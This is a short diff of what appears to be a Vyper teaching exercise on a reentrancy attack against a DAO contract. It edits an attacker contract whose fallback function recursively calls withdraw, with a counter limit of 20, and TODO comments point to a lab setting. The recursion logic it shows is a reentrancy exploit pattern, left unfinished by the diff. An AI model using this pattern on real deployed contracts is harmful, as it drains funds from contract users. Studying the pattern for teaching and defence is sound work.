@@ -20,7 +20,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     self.times +=1
     if self.times<20:
-      DAO(self.dao_address).withdraw()
+      
     
     
     return True
@@ -49,5 +49,5 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     
     # TODO: Add code here to complete the recursive call
-    self.attack()
+    self._attack()
     
